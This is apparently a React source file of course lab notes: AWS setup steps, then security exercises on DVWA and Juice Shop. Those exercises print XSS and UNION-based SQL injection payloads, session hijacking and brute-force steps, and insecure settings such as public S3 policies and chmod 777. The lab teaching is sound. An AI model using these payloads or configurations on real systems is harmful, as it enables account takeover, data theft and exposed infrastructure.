import { useState } from "react";

const CC_SECTIONS = [
  {
    id: "ec2",
    title: "EC2",
    content: `1. Windows:
   Create an EC2 → Select Windows
   Click on connect → RDP Client → Download Remote Desktop
   Get password → decrypt → paste in administrator
   Connect and administrator terminal will open

2. Putty:
   Create instance with key-pair ".ppk"
   Connect → EC2 instance connect
   Open Putty
   Paste IPV4 in hostname
   Left terminal → SSH → Auth → Credential
   Upload .ppk file → Click Open → Login as ubuntu

3. Puttygen:
   Open PuTTYgen → Click Load
   Change file type to All Files (.)
   Select your .pem file → Click Save private key → Save as .ppk
   Open Putty → Host: ec2-user@IP → Repeat Putty process`,
  },
  {
    id: "ebs",
    title: "EBS",
    content: `1(a) Creating and Attaching an EBS Volume

Step 1: Create EC2 instance with t2.micro
Step 2: EC2 Dashboard → Volumes → Create Volume
        Type: gp3 | Size: 20 GiB | Same AZ as EC2

Step 3: Attach Volume → Actions → Attach Volume
        Device name: /dev/xvdd

Step 4: Verify inside EC2 → lsblk

PHASE 2
Step 5: sudo fdisk /dev/xvdd → Inside fdisk: n p Enter Enter Enter w
        sudo partprobe
Step 6: lsblk
Step 7: sudo mkfs.xfs /dev/xvdd1
Step 8: sudo mkdir /mnt/ebsdata
Step 9: sudo mount /dev/xvdf1 /mnt/ebsdata → Verify: df -h
Step 10: cd /mnt/ebsdata && sudo touch testfile.txt && ls

PHASE 3
Step 11: sudo blkid /dev/xvdd1
Step 12: sudo nano /etc/fstab
         Add: UUID=xxxx... /mnt/ebsdata xfs defaults,nofail 0 0
Step 13: sudo mount -a
Step 14: sudo reboot → Reconnect → df -h`,
  },
  {
    id: "efs",
    title: "EFS",
    content: `1. Create Security Group
   Inbound: SSH → Anywhere | NFS → Anywhere

2. Create EFS → Add Security Group

3. Create 2 EC2 instances → Attach same Security Group

4. Run on both EC2 instances:
   sudo yum install -y amazon-efs-utils
   sudo mkdir /efs
   sudo mount -t efs <EFS-ID>:/ /efs

5. Permanent Mount:
   <EFS-ID>:/ /efs efs defaults,_netdev 0 0

EC2-1:
   cd /efs && echo "hello EC2-2" > /efs/test.txt

EC2-2:
   cat /efs/test.txt`,
  },
  {
    id: "s3",
    title: "S3",
    content: `1. Create Bucket
   Bucket Policy:
   {
     "Version": "2012-10-17",
     "Statement": [{
       "Sid": "PublicReadGetObject",
       "Effect": "Allow",
       "Principal": "*",
       "Action": "s3:GetObject",
       "Resource": "arn:aws:s3:::YOUR_BUCKET_NAME/*"
     }]
   }

2. Enable Versioning

3. Cross Region Replication
   Management → Create Replication
   Destination: Another region | Role: LabRole

4. Static Website Hosting
   Properties → Static Website Hosting → Enable
   Upload: index.html, error.html`,
  },
  {
    id: "vpc",
    title: "VPC",
    content: `Create VPC: CIDR 10.0.0.0/16

Subnets:
  Public:  10.0.1.0/24
  Private: 10.0.2.0/24

Internet Gateway: Create and Attach

Route Table:
  Destination: 0.0.0.0/0
  Attach Internet Gateway → Associate Public Subnet

EC2 Security Groups:
  Public:  SSH → Anywhere | HTTP → Anywhere
  Private: SSH → Public SG

Install Apache:
  sudo yum install httpd -y
  sudo systemctl start httpd && sudo systemctl enable httpd
  echo "Public EC2 Live" | sudo tee /var/www/html/index.html

Install Nginx:
  sudo yum update -y
  sudo yum install nginx -y
  sudo systemctl start nginx && sudo systemctl enable nginx`,
  },
  {
    id: "bastion",
    title: "VPC Bastion",
    content: `Create Bastion EC2 → Connect using ssh -i

Transfer key:
  scp -i "Key-pair.pem" Key-pair.pem ec2-user@IP:/home/ec2-user/

Inside Bastion:
  chmod 400 Key-pair.pem
  ssh -i Key-pair.pem ec2-user@PRIVATE_IP`,
  },
  {
    id: "nat",
    title: "VPC NAT Gateway",
    content: `1. Allocate Elastic IP
2. Create NAT Gateway
3. Create Private Route Table
4. Test:
   ping -c 3 google.com`,
  },
  {
    id: "lambda",
    title: "AWS Lambda",
    content: `Lambda Function

Step 1: Open AWS Lambda → Search Lambda → Open dashboard
Step 2: Create function → Select "Author from scratch"
Step 3: Name: MyFirstLambda | Runtime: Python 3.x
Step 4: Role → Select LabRole
Step 5: Code:

def lambda_handler(event, context):
    return "Hello AWS Lambda"

Step 6: Deploy & Test

──────────────────────────────────────────────

Add S3 Trigger to Lambda

Step 1: Login to AWS Console
Step 2: Create S3 Bucket → s3-lambda-demo123
Step 3: Create DynamoDB Table
        Table name: newtable | Partition key: unique (String)
Step 4: Create Lambda Function
        Name: S3ToDynamoDB | Runtime: Python 3.x
        Permissions: Create new role with basic Lambda permissions
Step 5: Attach permissions → Configuration → Permissions
        AmazonS3FullAccess, AmazonDynamoDBFullAccess, CloudWatchLogsFullAccess
Step 6: Lambda Code:

import boto3
from uuid import uuid4

def lambda_handler(event, context):
    dynamodb = boto3.resource('dynamodb')
    if 'Records' in event:
        for record in event['Records']:
            bucket_name = record['s3']['bucket']['name']
            object_key  = record['s3']['object']['key']
            size        = record['s3']['object'].get('size', -1)
            event_name  = record.get('eventName', 'Unknown')
            event_time  = record.get('eventTime', 'Unknown')
            table = dynamodb.Table('newtable')
            table.put_item(Item={
                'unique': str(uuid4()),
                'Bucket': bucket_name,
                'Object': object_key,
                'Size': size,
                'Event': event_name,
                'EventTime': event_time
            })

Step 7: Configure S3 Trigger
Step 8: Test
Step 9: Verify DynamoDB
Step 10: Monitor Logs`,
  },
  {
    id: "sns-sqs",
    title: "SNS and SQS",
    content: `1) SNS — Create Topic & Send to Email

Step 1: SNS → Topics → Create topic
        Type: Standard | Name: MyEmailTopic
Step 2: Create subscription → Protocol: Email → Enter email
Step 3: Confirm Subscription (check inbox)
Step 4: Publish message → Subject: Test Mail | Message: Hello SNS test

──────────

S3 → SNS → Email Flow

Step 1: Create S3 Bucket → my-upload-bucket-2026
Step 2: Create SNS Topic → S3UploadNotification
Step 3: SNS Access Policy (allow S3 to publish):
{
  "Statement": [{
    "Effect": "Allow",
    "Principal": { "Service": "s3.amazonaws.com" },
    "Action": "sns:Publish",
    "Resource": "arn:aws:sns:us-east-1:ACCOUNT:MyEmailTopic",
    "Condition": {
      "StringEquals": { "aws:SourceAccount": "ACCOUNT_ID" },
      "ArnLike": { "aws:SourceArn": "arn:aws:s3:::my-upload-bucket-2026" }
    }
  }]
}
Step 4: S3 Event Notification → All object create → SNS
Step 5: Test — Upload file → receive email

──────────

2) SQS

Step 1: Create Queue → Name: MyQueue | Type: Standard
Step 2: Send Message → "Hello this is SQS test message"
Step 3: Poll for messages → View message

──────────

3) S3 → SNS → SQS → Lambda

Architecture: S3 → SNS → SQS → Lambda

Step 1:  Create S3 Bucket → mys3eventbucket123
Step 2:  Create SNS Topic → MyS3SNSTopic
Step 3:  Create SQS Queue → MyS3Queue
Step 4:  Subscribe SQS to SNS (Protocol: SQS)
Step 5:  Add SQS Access Policy (allow SNS to send)
Step 6:  Add SNS Access Policy (allow S3 to publish)
Step 7:  Configure S3 Event → All object create → SNS
Step 8:  Test: Upload to S3 → SNS → SQS
Step 9:  Verify in SQS → Poll messages
Step 10: Lambda Consumer:

def lambda_handler(event, context):
    for record in event['Records']:
        print("Message received from SQS:")
        print(record['body'])
    return {'statusCode': 200, 'body': 'Message processed'}`,
  },
  {
    id: "elb",
    title: "Elastic Load Balancer",
    content: `PART 1-2 — Create Two EC2 Web Servers

Step 1: Launch webserver-1 (Amazon Linux 2, t2.micro)
        SG: SSH port 22, HTTP port 80
Step 2: Connect & install Apache:
  sudo yum update -y && sudo yum install httpd -y
  sudo systemctl start httpd && sudo systemctl enable httpd
  echo "This is Server 1" | sudo tee /var/www/html/index.html
Step 3: Launch webserver-2 (same SG)
Step 4: Same Apache install → "This is Server 2"

PART 3 — Create LB Security Group
  Name: lb-sg | Inbound: HTTP port 80 → 0.0.0.0/0

PART 4 — Create Application Load Balancer
  Name: my-alb | Scheme: Internet-facing | IPv4
  Listener: HTTP:80
  VPC: Default | Subnets: 2 AZs (us-east-1a, us-east-1b)
  SG: lb-sg

PART 5 — Create Target Group
  Name: web-servers-tg | Target Type: Instance
  Protocol: HTTP | Port: 80 | Health Check: /
  Register: webserver-1, webserver-2

PART 6 — Attach Target Group → Listener → Forward to web-servers-tg

PART 7 — Test: Copy DNS name → refresh browser
  Output alternates: "This is Server 1" / "This is Server 2"

PART 8 — Create AMI
  Select webserver-1 → Actions → Image → Create Image
  Name: my-webserver-ami

PART 9 — Launch Template
  Name: my-launch-template | AMI: my-webserver-ami
  Instance Type: t2.micro

PART 10-12 — Auto Scaling Group
  Name: webserver-asg | Template: my-launch-template
  VPC: Default | All subnets
  Attach: my-alb | Health Check: ELB | Grace Period: 300s
  Desired: 2 | Min: 1 | Max: 4

PART 13-15 — Verify & Test
  Terminate an instance → ASG auto-launches replacement
  Open LB DNS → refresh → traffic switches between servers`,
  },
  {
    id: "beanstalk",
    title: "Elastic Beanstalk",
    content: `Step 1: Login → AWS Academy → Learner Lab
Step 2: All Services → Compute → Elastic Beanstalk
Step 3: Create Application → Name: beanstalk-app
Step 4: Platform: Node.js
Step 5: Upload application code
        ZIP Structure (must be from inside project folder):
          package.json
          server.js
        cd beanstalk-app && zip -r app.zip .
        Upload: app.zip
Step 6: Environment Type: Web server environment
        Instance Type: t2.micro (important — other types may fail)
Step 7: Click Create → Wait 5-7 minutes
        AWS will: Create EC2, Install Node.js, Deploy app
Step 8: Access URL:
        http://beanstalk-app-env.eba-xxxxx.ap-south-1.elasticbeanstalk.com
        Expected: Hello from AWS Elastic Beanstalk!`,
  },
  {
    id: "lex",
    title: "Amazon Lex",
    content: `Amazon Lex – Hotel Booking Bot

Step 1: Search Amazon Lex → Click Create bot
Step 2: Create blank bot
        Name: HotelBookingBot | IAM: Create new role | Language: English
Step 3: Create Intent → Name: BookHotel
Step 4: Sample Utterances:
        "I want to book a hotel" | "Book a room" | "Reserve hotel" | "I need a room"
Step 5: Slots:
  Slot 1 — age (AMAZON.Number)  Prompt: "What is your age?"
           Condition: if {age} < 18 → "You are not eligible"
  Slot 2 — location (AMAZON.City)  Prompt: "Which city?"
  Slot 3 — checkin (AMAZON.Date)  Prompt: "Check-in date?"
  Slot 4 — nights (AMAZON.Number) Prompt: "How many nights?"
Step 6: Custom Slot Type → RoomType
        Values: Single | Double | Suite
Step 7: Add buttons in prompt card: Single | Double | Suite
Step 8: Responses:
        Initial: "Welcome to Hotel Booking! What is your name?"
        Confirmation: "Confirm booking in {location} for {nights} nights?"
Step 9: Build and Test

Sample conversation:
  User: Book a hotel  →  Bot: What is your age?
  User: 25            →  Bot: Which city?
  User: Hyderabad     →  Bot: Check-in date?
  User: Tomorrow      →  Bot: Nights?
  User: 2             →  Bot: Select room type
  User: Double        →  Bot: Confirm booking?
  User: Yes           →  Bot: Booking confirmed`,
  },
  {
    id: "iam",
    title: "IAM",
    content: `Part A: GUI Access (Management Console)

Step 1:  Login as Root User
Step 2:  Search IAM → Security, Identity, & Compliance
Step 3:  Users → Create user
Step 4:  Username: S3_Specialist
         Enable: "Provide user access to the AWS Management Console"
         Set custom password
Step 5:  Attach policies directly → AmazonS3FullAccess
Step 6:  Review → Create → Download .csv (contains password + sign-in URL)
Step 7:  Copy 12-digit Account ID → Sign out

Verification (IAM User Login):
Step 8:  Open Sign-in URL from .csv
Step 9:  Enter: Account ID | Username | Password
Step 10: Test 1 (Fail): Go to EC2 → Access Denied
         Test 2 (Pass): Go to S3 → Create bucket → Works

──────────

Part B: CLI Access (Programmatic)

Step 1:  Login as Admin → IAM → Users → Select user
Step 2:  Security credentials → Access keys → Create access key
Step 3:  Select: Command Line Interface (CLI)
Step 4:  Download .csv (Access Key ID + Secret Access Key)
Step 5:  Install AWS CLI
Step 6:  Open Terminal → Run: aws configure
Step 7:  Enter: Access Key ID, Secret Access Key
         Default region: ap-south-1 | Default output: json

Verification:
  aws s3 ls              → Lists S3 buckets ✓
  aws s3 mb s3://bucket  → Creates bucket ✓
  aws iam list-users     → AccessDenied ✗`,
  },
  {
    id: "iam-roles",
    title: "IAM Roles",
    content: `Objective: Allow EC2 to access S3 without storing access keys.

Step 1: IAM → Roles → Create role
        Trusted entity: AWS Service | Use case: EC2 → Next
Step 2: Search: AmazonS3FullAccess → Select → Next
Step 3: Role name: EC2-S3-Role → Create role
Step 4: EC2 Dashboard → Select running instance
        Actions → Security → Modify IAM role
        Select: EC2-S3-Role → Update
Step 5: SSH into instance and verify:

  aws s3 ls                 → ✓ Works (S3 allowed)
  aws ec2 describe-instances → ✗ Unauthorized`,
  },
];

const CS_SECTIONS = [
  {
    id: "firewall",
    title: "Firewall",
    content: `GUI Method:
  1. Open Windows Defender Firewall with Advanced Security.
  2. Click on Inbound Rules.
  3. Click New Rule,on the right panel.
  4. Select Custom and click Next.
  5. Choose All Programs → Click Next.
  6. Protocol and Ports: Keep default → Click Next.
  7. Scope:
    o Under Remote IP address, select These IP addresses.
    o Click Add and enter the IP you want to block (example: 1.2.3.4).
    o Click OK → Next.
  8. Action: Select Block the connection → Next.
  9. Profile: Select Domain, Private, Public → Next.
  10. Name the rule (example: Manual_Block_IP) → Finish.


──────────

Python Script (Block IPs from threat feed):

import requests
import csv
import subprocess

response = requests.get(
    "https://feodotracker.abuse.ch/downloads/ipblocklist.csv"
).text

rule = 'netsh advfirewall firewall delete rule name="BadIP"'
subprocess.run(["PowerShell", "-Command", rule])

mycsv = csv.reader(
    filter(lambda x: not x.startswith("#"), response.splitlines())
)

for row in mycsv:
    ip = row[1]
    if ip != "dst_ip":
        print("Added Rule to block:", ip)
        rule = (
            "netsh advfirewall firewall add rule "
            "name='BadIP' Dir=Out Action=Block RemoteIP=" + ip
        )
        subprocess.run(["PowerShell", "-Command", rule])

        Sample Output:
          Added Rule to block: 45.9.148.221
          Added Rule to block: 103.17.48.5
          Added Rule to block: 185.234.219.12


        Execution Steps:
          1. Open Command Prompt and select Run as Administrator.
          (Firewall rules require admin rights.)
          2. Navigate to the folder where firewall.py is saved.
          Example: cd C:\\Users\\YourName\\Desktop
          3. Make sure Python is installed: python --version
          4. install required library (if not already installed):- python -m pip install requests
          5. Execute the program: python firewall.py
          6. Output will appear in Command Prompt like:
          Added Rule to block: 45.9.148.221
          Added Rule to block: 103.17.48.5
          For every IP, you will see:
            o "Added Rule to block: <IP>"
            o PowerShell/Command Prompt will also show OK message for successful rule
            creation.
          7. Cross-verify the rules:
            o Open Windows Defender Firewall with Advanced Security
            o Go to Outbound Rules
            o Search for rule name: BadIP
            o You will see many blocked IP addresses listed`,
  },
  {
    id: "xss",
    title: "XSS",
    content: `Aim
  To identify and exploit Cross-Site Scripting (XSS) vulnerabilities in a vulnerable web application (DVWA) using Kali Linux.

Requirements
  Kali Linux
  DVWA (Damn Vulnerable Web Application)
  Browser (Firefox/Chromium)
  Apache & MySQL running

Step 1: Start DVWA Services
  Open terminal:
    sudo service apache2 start
    sudo service mysql start
  Open browser and go to:
    http://localhost/dvwa
    Login Credentials
    Username: admin
    Password: password
  Set security level:
    DVWA Security → Low → Submit

Step 2: Understanding XSS
  XSS allows attackers to inject JavaScript code into a webpage that runs in another user's browser.
  Types in DVWA
    Reflected XSS
    Stored XSS
    DOM Based XSS

Step 3: Reflected XSS Test
  Go to:
    DVWA → XSS (Reflected)
  In the input box, type:
    <script>alert('XSS')</script>
  Click Submit.
  Output
    You will see a popup alert → XSS vulnerability confirmed.

Step 4: Stored XSS Test
  Go to:
    DVWA → XSS (Stored)
  Fill the form:
    Name:
      <h1>Hacked</h1>
    Message:
      <script>alert('Stored XSS')</script>
    Click:
      Sign Guestbook
    Refresh page → popup appears every time → Stored XSS successful.

Step 5: DOM Based XSS
  Go to:
    DVWA → XSS (DOM)
  In the URL bar add:
    #<script>alert('DOM XSS')</script>
  Press Enter → popup appears.

Step 6: Capture Cookie (Lab Demo)
  In Stored XSS Message box:
    <script>alert(document.cookie)</script>
  This shows session cookies (demo of session theft).

Step 7: Change Security Level
  Go to:
    DVWA Security
  Set:
    Medium
    High
    Repeat the same payloads → see how filtering blocks them.

Result
  XSS vulnerabilities were successfully identified and exploited in DVWA.`,
  },
  {
    id: "packet",
    title: "Packet Tracing",
    content: `Step 1:
  Open Kali Linux.

Step 2:
  Open Terminal in Kali Linux.

Step 3:
  Start a local HTTP server on port 8080 using:
    python3 -m http.server 8080

Step 4:
  In another new terminal start packet capture:
    sudo tcpdump -i any -w capture.pcap port 8080

Step 5:
  Open Firefox in Kali Linux and go to:
    http://localhost:8080
  Refresh the page to generate traffic.

Step 6:
  Go back to tcpdump terminal.
  Stop packet capturing by using:
    Ctrl + C
  It will stop and show how many packets were captured.
  The packets are saved as:
    capture.pcap

Step 7:
  Click the Kali Linux dragon icon (top left).
  Type: File Manager and open it.
  Your Home folder will open.
  You will see the file: capture.pcap.

Step 8:
  Since Wireshark is pre-installed in Kali, just double-click capture.pcap.
  The file will open directly in Wireshark for analysis.

Step 9:
  Filter Login Packets
  In Wireshark filter bar, type:
    http.request.method == "POST"
  Press Enter.
  Now only important packets will show.

Step 10:
  Click on any one of the packet and the following data is displayed.
  Browser details such as:
    OS
    Browser version
    Language
    Visited URLs
  are visible.
  If a form is submitted, username and password can be seen in plain text.
  This proves HTTP is insecure.

Conclusion
  Packets were successfully captured and analyzed. Sensitive data is visible when HTTP is used.
  Packet sniffing and network traffic analysis show that unencrypted communication is unsafe.
  HTTPS is necessary to protect data.`,
  },
  {
    id: "sqli",
    title: "SQL Injection",
    content: `1. Aim of the Experiment:
  To understand how SQL Injection vulnerabilities occur and how attackers exploit improper input validation to bypass authentication and extract database information.

2. Requirements
  Kali Linux (VM or bare metal)
  DVWA or WebGoat
  Apache & MySQL (MariaDB)
  Web browser (Firefox)
  Basic SQL knowledge

3. Setting Up DVWA in Kali Linux
  Step 1: Install DVWA
    sudo apt update
    sudo apt install dvwa -y
  Step 2: Start Required Services
    sudo service apache2 start
    sudo service mysql start
  Step 3: Configure DVWA
    Edit config file:
    sudo nano /etc/dvwa/config.inc.php
    Ensure:
      $_DVWA['db_password'] = '';
    Save and exit.
  Step 4: Open DVWA in Browser (Firefox)
    http://127.0.0.1/dvwa
    Login Credentials
    Username: admin
    Password: password
    Click Create / Reset Database.
  Step 5: Set Security Level
    Go to DVWA Security
    Set Security Level = Low
    Click Submit

4. SQL Injection Attack on DVWA
  Step 6: Navigate to SQL Injection Module
    DVWA → Vulnerabilities → SQL Injection
    You will see an input box asking for User ID.

5. Basic SQL Injection Test
  Step 7: Normal Input
    1
    Displays user details normally.
  Step 8: Authentication Bypass
    Enter:
      1' OR '1'='1
  Result:
    All user records are displayed
    Confirms SQL Injection vulnerability

6. SQL Injection – Database Enumeration
  Step 9: Find Number of Columns
    1' ORDER BY 1-- -
    1' ORDER BY 2-- -
    1' ORDER BY 3-- -
    Stop when error occurs.
  Last successful number = total columns.
  Step 10: UNION-Based Injection
    1' UNION SELECT 1,2-- -
  Step 11: Extract Database Name
    1' UNION SELECT database(),2-- -
  Step 12: Extract Table Names
    1' UNION SELECT table_name,2
    FROM information_schema.tables
    WHERE table_schema=database()-- -
  Step 13: Extract Column Names
    1' UNION SELECT column_name,2
    FROM information_schema.columns
    WHERE table_name='users'-- -
  Step 14: Extract Username & Password
    1' UNION SELECT user,password FROM users-- -
    Passwords may appear as hashes.

7. Result
  The SQL Injection attack was successfully performed, demonstrating:
    Authentication bypass
    Unauthorized data access
    Poor input validation vulnerability

8. Conclusion
  This experiment proves that:
    Unsanitized user input leads to SQL Injection
    Attackers can extract sensitive database information
    Proper security controls are mandatory`,
  },
  {
    id: "phishing",
    title: "Phishing",
    content: `Step 1: Open suspicious email
Step 2: Click 3 dots → Show Original
Step 3: Download original file (.eml)

Analysis:
Step 4: Open eml-analyzer (browser tool)
        Upload downloaded file → Analyze
Step 5: Copy URL from header

Verification:
Step 6: Open VirusTotal → Paste URL → Check results`,
  },
  {
    id: "password",
    title: "Password Strength Checker",
    content: `import re
def check_password_strength(password):
    if len(password) < 8:
        return "Weak: Password must be at least 8 characters long."

    if not any(char.isdigit() for char in password):
        return "Weak: Password must include at least one number."

    if not any(char.isupper() for char in password):
        return "Weak: Password must include at least one uppercase letter."

    if not any(char.islower() for char in password):
        return "Weak: Password must include at least one lowercase letter."

    if not re.search(r'[!@#$%^&*(),.?":{}|<>]', password):
        return "Medium: Add special characters to make your password stronger."

    return "Strong: Your password is secure!"

def password_checker():
    print("Welcome to the Password Strength Checker!")
    while True:
        password = input("\\nEnter your password (or type 'exit' to quit): ")

        if password.lower() == "exit":
            print("Thank you for using the Password Strength Checker! Goodbye!")
            break

        result = check_password_strength(password)
        print(result)

if __name__ == "__main__":
    password_checker()`,
  },
  {
    id: "session-auth",
    title: "Session Authentication",
    content: `AIM
  To identify and analyze authentication weaknesses and session management vulnerabilities using DVWA in Kali Linux.

REQUIREMENTS
  Software
    Kali Linux
    DVWA (Pre-installed on lab systems)
    Web Browser (Firefox)
  Hardware
    Computer System with Internet Disabled (Lab Setup)

THEORY
  Authentication Weakness
    Authentication ensures that only valid users can log in. Weak authentication occurs due to:
      Weak passwords
      No account lockout
      Brute force vulnerability
      Default credentials
  Session Management
    Session management handles user sessions using session IDs. Improper session handling leads to:
      Session hijacking
      Session fixation
      Reuse of old session IDs
      Insecure cookies

PROCEDURE
PART A: Launch DVWA
  Step 1: Start Required Services
    Open terminal and start Apache and MySQL:
      sudo service apache2 start
      sudo service mysql start
  Step 2: Open DVWA in Browser
    Open Firefox and enter:
      http://127.0.0.1/dvwa
  Step 3: Login to DVWA
    Use default credentials:
      Username: admin
      Password: password
  Step 4: Set Security Level
    Go to DVWA Security
    Select LOW
    Click Submit

PART B: Testing Authentication Weaknesses
  Experiment 1: Weak Password Authentication
    Step 1: Open Brute Force Module
      Navigate to:
        DVWA → Vulnerabilities → Brute Force
    Step 2: Try Common Passwords
      Enter:
        Username: admin
        Password: password
      Observation
        Successful login indicates weak authentication.

  Experiment 2: Manual Brute Force Attack
    Enter Username (Same Every Time)
    In Username field, type:
      admin
    Do NOT change username.
    Step 3: Try Passwords ONE BY ONE
      Attempt 1
        Username: admin
        Password: admin
        Click Login.
        ❌ If it fails → try next password.

      Attempt 2
        Username: admin
        Password: 123456
        Click Login.
        ❌ If it fails → try next password.

      Attempt 3
        Username: admin
        Password: password
        Click Login.
        ✅ LOGIN SUCCESSFUL

    Step 4: Observe What Happened
      DVWA did NOT block you
      DVWA did NOT lock account
      DVWA allowed unlimited attempts
      This is called Brute Force Vulnerability.

PART C: Testing Session Management Vulnerabilities
  Experiment 3: Session ID Analysis
    Step 1: Login to DVWA
      Open browser developer tools:
        Right Click → Inspect → Storage → Cookies
    Step 2: Observe Session Cookie
      Look for:
        PHPSESSID
      Observation
        Session ID is visible and not encrypted.
      Example:
        PHPSESSID : 5f6194766020dcaa2c906358cbd2941b`,
  },
  {
    id: "session-hijack",
    title: "Session Hijacking",
    content: `Session Hijacking

BEFORE YOU START
  DVWA security level = LOW
  You are logged in as admin in DVWA

Step 1: Open DVWA (Victim Session)
  Open Firefox
  Go to:
    http://127.0.0.1/dvwa
  Login:
    Username: admin
    Password: password
  Stay logged in (do NOT logout)
  This browser is the Victim.

Step 2: Copy the Session ID (PHPSESSID)
  Right click → Inspect
  Click Storage tab
  Click Cookies
  Select:
    http://127.0.0.1
  You will see:
    PHPSESSID a8c9f7e3d4b1...
  Copy the PHPSESSID value.
  This value is the session ID (user identity).

Step 3: Open Attacker Browser (Private Window)
  Press:
    Ctrl + Shift + P
  Private Window opens.
  Do NOT login here.

Step 4: Paste Session ID in Attacker Browser
  In Private Window, go to:
    http://127.0.0.1/dvwa
  Right click → Inspect
  Go to Storage → Cookies
  Replace PHPSESSID with copied value
  Press Enter

Step 5: Refresh Page
  Refresh using:
    F5
  You are logged in as admin without username or password.
  Result
    Attacker gains access without login → Session Hijacking.

Experiment 5: Session Fixation
  IMPORTANT CONDITIONS
    DVWA Security Level = LOW
    Use only ONE browser window
    Do NOT use Private Window

  Step 1: Open DVWA WITHOUT Login
    Go to:
      http://127.0.0.1/dvwa/
    Do NOT login.

  Step 2: Note the Session ID (Before Login)
    Inspect → Storage → Cookies → http://127.0.0.1
    Example:
      PHPSESSID = 5f6194766020dcaa2c906358cbd2941b

  Step 3: Login WITHOUT Closing Browser
    Enter:
      Username: admin
      Password: password
    Click Login.

  Step 4: Check Session ID AGAIN (After Login)
    Observe PHPSESSID carefully.
    Case 1 (VULNERABLE – DVWA LOW)
      Before Login PHPSESSID = 5f6194766020dcaa2c906358cbd2941b
      After Login  PHPSESSID = 5f6194766020dcaa2c906358cbd2941b
      Same value → Session Fixation exists.
    Case 2 (SECURE – DVWA HIGH / IMPOSSIBLE)
      Before Login PHPSESSID = 5f6194766020dcaa2c906358cbd2941b
      After Login  PHPSESSID = be2d584526b42fef6742d5cf95ce008f
      Session regenerated → No session fixation.

Experiment 6
  CONDITIONS
    DVWA Security Level = LOW
    Must know how to view cookies

  Step 1: Login Normally
    Go to:
      http://127.0.0.1/dvwa/
    Login using:
      Username: admin
      Password: password

  Step 2: Copy Session ID
    Inspect → Storage → Cookies → http://127.0.0.1
    Copy:
      PHPSESSID = be2d584526b42fef6742d5cf95ce008f

  Step 3: Logout from DVWA
    Click Logout.
    You will see login page.

  Step 4: Reuse OLD Session ID
    Option A (Exam Safe)
    Open Private Window
      Ctrl + Shift + P
    Go to:
      http://127.0.0.1/dvwa/
    Open Inspect → Storage → Cookies
    Paste OLD PHPSESSID
    Press Enter

  Step 5: Open Internal Page
    Open:
      http://127.0.0.1/dvwa/index.php
      or
      http://127.0.0.1/dvwa/vulnerabilities/brute/
    Do NOT login.
    Expected Result (DVWA LOW)
      Logged in again
      Without login
      Using old session ID
      Logout did NOT destroy session`,
  },
  {
    id: "dvwa",
    title: "DVWA Installation",
    content: `STEP 0 — Clean Previous Install
  sudo rm -rf /var/www/html/dvwa
  sudo service apache2 restart

STEP 1 — Install Packages
  sudo apt update
  sudo apt install apache2 mariadb-server php php-mysqli php-mysql php-gd git -y

STEP 2 — Start Services
  sudo service apache2 start
  sudo service mysql start

STEP 3 — Create Database
  sudo mysql
  > CREATE DATABASE dvwa;
  > CREATE USER 'dvwa'@'localhost' IDENTIFIED BY 'dvwa';
  > GRANT ALL PRIVILEGES ON dvwa.* TO 'dvwa'@'localhost';
  > FLUSH PRIVILEGES;
  > EXIT;

STEP 4 — Clone DVWA
  cd /var/www/html
  sudo git clone https://github.com/digininja/DVWA.git
  sudo mv DVWA dvwa

STEP 5 — Permissions
  sudo chmod -R 777 /var/www/html/dvwa

STEP 6 — Configure
  cd /var/www/html/dvwa/config
  sudo cp config.inc.php.dist config.inc.php
  sudo nano config.inc.php
  Set:
    $_DVWA['db_server']   = '127.0.0.1';
    $_DVWA['db_database'] = 'dvwa';
    $_DVWA['db_user']     = 'dvwa';
    $_DVWA['db_password'] = 'dvwa';

STEP 7 — Restart Apache
  sudo service apache2 restart

STEP 8 — Open DVWA
  http://localhost/dvwa
  Login: admin / password
  Click: Create / Reset Database

STEP 9 — Set Security Level
  DVWA Security → Low → Submit

AFTER REBOOT:
  sudo service apache2 start
  sudo service mysql start
  → Open http://localhost/dvwa`,
  },
  {
    id: "android",
    title: "Analyzing Android App Permissions",
    content: `PHASE 1: Start Burp Suite
  Launch Burp Suite → Proxy → Intercept → Turn ON
  Configure Listener:
    Proxy → Options → Proxy Listeners
    Bind to: All Interfaces | Port: 8080 → OK

PHASE 2: Connect Emulator to Burp
  Inside Emulator: Settings → Network & Internet → WiFi
  Edit → Advanced Options:
    Proxy: Manual | Hostname: 10.0.2.2 | Port: 8080
  Test: Open Chrome → http://example.com
  Verify in Burp → HTTP History → requests visible ✓

PHASE 3: Capture HTTPS Traffic
  Step 1: Burp → Proxy → Options → Import/Export CA Certificate
          Export Certificate (DER format) → Save as burpcer.der
  Step 2: Send to Emulator:
    cd C:\\Users\\...\\platform-tools
    adb push burpcer.der /sdcard/Download/
  Step 3: Emulator → Settings → Security & Privacy
          → Encryption & Credentials → Install Certificate
          → CA Certificate → Install burpcer.der

Final Test:
  Open Chrome → https://example.com
  HTTPS traffic visible in Burp Suite ✓`,
  },
  {
    id: "iot",
    title: "Testing IoT Device Security",
    content: `Tools: Windows 10, Docker Desktop, OWASP Juice Shop, Kali Linux, Nmap

Step 1: Deploy Vulnerable IoT Simulation
  docker run -d -p 8090:3000 --name juiceshop bkimminich/juice-shop
  Access: http://localhost:8090

Step 2: Identify Host IP
  ipconfig (on Windows)

Step 3: Network Scan from Kali
  nmap -sV 192.168.x.x
  (port scanning + service + version detection + banner grabbing)

Step 4: Access Web Dashboard
  http://localhost:8090

Step 5: Test Default Credentials
  Try administrator login → success = weak auth vulnerability

Step 6: Analyze Traffic (DevTools → Network tab)
  → Data visible in plain text → no encryption

Vulnerabilities Found:
  1. Open Port Exposure (port 8090 accessible)
  2. Service Enumeration (version info visible)
  3. Unencrypted Communication (HTTP, no TLS)
  4. Weak Authentication (default credentials)
  5. Information Disclosure (server headers exposed)`,
  },
  {
    id: "ftk",
    title: "Disk Images with FTK Imager",
    content: `Tools: Kali Linux, dc3dd, Autopsy

Step 1: Open Terminal → Ctrl + Alt + T
Step 2: Create evidence file:
  echo "Cybersecurity Lab Evidence" > evidence.txt
Step 3: Identify disk → lsblk (e.g., sda, sda1, sda2)
Step 4: Create Disk Image:
  dd if=/dev/zero of=practice_disk.dd bs=1M count=100
  mkfs.ext4 practice_disk.dd
  sudo dc3dd if=/dev/sda of=/home/kali/practice_disk.dd log=/home/kali/acquisition.log
Step 5: Verify:
  ls -lh /home/kali/practice_disk.dd
  cat /home/kali/acquisition.log
Step 6: Start Autopsy:
  autopsy → Open http://localhost:9999/autopsy
Step 7: Create New Case → Enter case details
Step 8: Add Disk Image:
  Add Host → Add Image → /home/kali/practice_disk.dd
  Host: KaliLabMachine | Description: Kali Linux VM
